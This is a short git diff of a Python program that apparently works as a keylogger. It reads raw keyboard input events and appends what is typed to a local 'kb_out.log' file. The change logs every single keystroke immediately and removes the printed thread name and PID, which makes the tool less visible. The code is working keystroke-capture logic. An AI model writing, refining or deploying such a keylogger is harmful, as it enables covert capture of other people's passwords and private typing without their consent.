@@ -4,7 +4,7 @@ import struct
 import os
 import threading as th
 
-BUFFER_LENGTH = 10
+BUFFER_LENGTH = 1
 FORMAT = 'llHHI'
 EVENT_SIZE = struct.calcsize(FORMAT)
 OUT_FILE = "kb_out.log"
@@ -91,8 +91,6 @@ class Keyboard:
         self.typed = ""
 
     def data_stream(self):
-        print(f"Thread {th.current_thread().name} online")
-        print(f"---PID {os.getpid()}")
         self.infile = open(self.infile_path, "rb")
         self.event = self.infile.read(EVENT_SIZE)
         while self.event:
@@ -106,5 +104,6 @@ class Keyboard:
 
             if len(self.typed) >= BUFFER_LENGTH:
                 with open(OUT_FILE, "a") as f:
-                    f.write(self.typed)
+                    #self.typed += "\n"
+                    f.write(self.typed + "\n")
                     self.typed = ""
